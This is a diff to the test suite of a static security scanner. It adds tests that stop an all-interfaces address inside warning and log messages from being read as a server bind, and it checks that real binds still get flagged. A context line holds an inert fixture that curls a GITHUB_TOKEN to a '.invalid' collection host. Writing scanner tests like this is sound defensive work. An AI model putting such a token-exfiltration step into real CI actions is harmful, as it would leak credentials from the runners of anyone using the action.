@@ -1,4 +1,5 @@
-"""Ruleset 69: the last two detection gaps a blind red-team found (2026-10-10).
+"""Ruleset 69: the last two detection gaps a blind red-team found (2026-10-10), and a false
+positive found by dogfooding.
 
 Gap A — a dangerous callable or a module reached through a name that was bound to a
 ``getattr`` / ``__import__`` / ``importlib.import_module`` result, then called later in the same
@@ -10,8 +11,13 @@ Gap B — a composite GitHub Action ``run:`` step that sends a CI token (``GITHU
 ``${{ github.token }}``) to a non-GitHub host through a network client — credential exfiltration
 on the runner of whoever uses the action.
 
-Each gap is pinned by a sample that fails on ruleset 68 and by the near-misses that must stay
-clean. Sanitized fixtures only: hosts are ``.invalid``, commands are inert, nothing is executed.
+Gap C — ``ST-EXPOSE-BIND`` read an all-interfaces address inside a warning or log message
+(``f"WARNING: binding {host or '0.0.0.0'} ..."``) as a bind. An address inside a format or
+template string whose constant text contains whitespace is prose; a bind string never is.
+
+Each item is pinned by a sample that fails on ruleset 68 and by the near-misses that must stay
+as they were. Sanitized fixtures only: hosts are ``.invalid``, commands are inert, nothing is
+executed.
 """
 
 from __future__ import annotations
@@ -317,3 +323,96 @@ def test_the_action_secret_exfil_pass_is_linear(tmp_path: Path):
     run = "echo " + "a" * 40000 + ' ; curl -d "$GITHUB_TOKEN" https://collect.invalid/c'
     yml = _HEAD + run + "\n"
     _timed(lambda: _ids(_write(tmp_path, {"action.yml": yml})))
+
+
+# =====================================================================================
+# Gap C — ST-EXPOSE-BIND false positive: an all-interfaces address inside a warning message
+# =====================================================================================
+
+_WARNING_FSTRING = (
+    "import sys\n"
+    "def serve(host, api_key, app, port):\n"
+    '    if host in ("0.0.0.0", "::", "") and not api_key:\n'
+    "        print(\n"
+    "            f\"WARNING: binding {host or '0.0.0.0'} with no api-key exposes the server \"\n"
+    '            "unauthenticated on the network.",\n'
+    "            file=sys.stderr,\n"
+    "        )\n"
+    "    uvicorn.run(app, host=host, port=port)\n"
+)
+
+
+def test_an_all_interfaces_address_in_a_warning_message_is_not_a_bind(tmp_path: Path):
+    # The only risky construct here was the address literal inside a warning f-string, which is
+    # prose (its constant text has spaces), not a bind. Nothing in this file binds a server.
+    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"server.py": _WARNING_FSTRING}))
+
+
+def test_an_all_interfaces_address_in_a_log_message_is_not_a_bind(tmp_path: Path):
+    # The same message handed to a logger rather than print(): not a bind either.
+    src = (
+        "import logging\nlog = logging.getLogger(__name__)\n"
+        "def serve(host):\n"
+        "    log.warning(f\"refusing to listen on {host or '0.0.0.0'} without a key\")\n"
+    )
+    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"serve.py": src}))
+
+
+@pytest.mark.parametrize(
+    "name, src",
+    [
+        # a fallback into the all-interfaces address, assigned and then bound
+        (
+            "assign_fallback",
+            'host = args.host or "0.0.0.0"\nuvicorn.run(app, host=host, port=port)\n',
+        ),
+        # the fallback directly in the bind call's host keyword
+        ("kw_fallback", 'uvicorn.run(app, host=args.host or "0.0.0.0")\n'),
+        # a real bind address built with an f-string: host:port, no whitespace in the constants
+        ("bind_fstring", "bind = f\"{host or '0.0.0.0'}:{port}\"\n"),
+    ],
+)
+def test_real_all_interfaces_binds_still_flag(tmp_path: Path, name: str, src: str):
+    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {f"{name}.py": src}))
+
+
+def test_a_warning_message_bind_in_a_js_template_is_not_a_bind(tmp_path: Path):
+    # A logger call (not console.*, whose arguments were already read as printed text).
+    js = "logger.warn(`binding ${host || '0.0.0.0'} with no token leaves it open`);\n"
+    assert "ST-EXPOSE-BIND" not in _ids(_write(tmp_path, {"warn.js": js}))
+
+
+def test_a_bind_built_with_a_js_template_still_flags(tmp_path: Path):
+    js = "const bind = `${host || '0.0.0.0'}:${port}`;\nserver.listen(bind);\n"
+    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {"serve.js": js}))
+
+
+def test_a_real_bind_after_an_unbalanced_code_fence_in_a_comment_still_flags(tmp_path: Path):
+    # A markdown fence in a JSDoc block leaves an odd backtick in a comment. Templates come from
+    # the lexer, so that backtick cannot open a "template" that runs over the real bind below.
+    js = "/** Example: ```js */\nserver.listen(3000, '0.0.0.0');\nconst t = `x`;\n"
+    assert "ST-EXPOSE-BIND" in _ids(_write(tmp_path, {"serve.js": js}))
+
+
+def test_the_warning_message_suppression_pass_is_linear(tmp_path: Path):
+    # The added suppression (an address literal inside a prose f-string / JS template) must be
+    # linear. Timed on its own, apart from ast.parse, which the engine already pays per .py file.
+    import ast
+
+    from skilltotal.scanners.exposure import (
+        ExposureScanner,
+        _js_prose_template_spans,
+        _python_prose_fstring_lines,
+    )
+
+    py = "def f(host):\n" + (
+        "    log(f\"please do not expose {host or '0.0.0.0'} without a key here now\")\n" * 8_000
+    )
+    tree = ast.parse(py)
+    _timed(lambda: _python_prose_fstring_lines(tree))
+
+    js = "logger.warn(`binding ${host || '0.0.0.0'} with no token leaves it open`);\n" * 8_000
+    index = _one_file(tmp_path, "warn.js", js)
+    _timed(lambda: _js_prose_template_spans(index.files[0]))
+    # ...and the per-match lookup over those spans, through the whole bind pass.
+    _timed(lambda: ExposureScanner().scan(index))
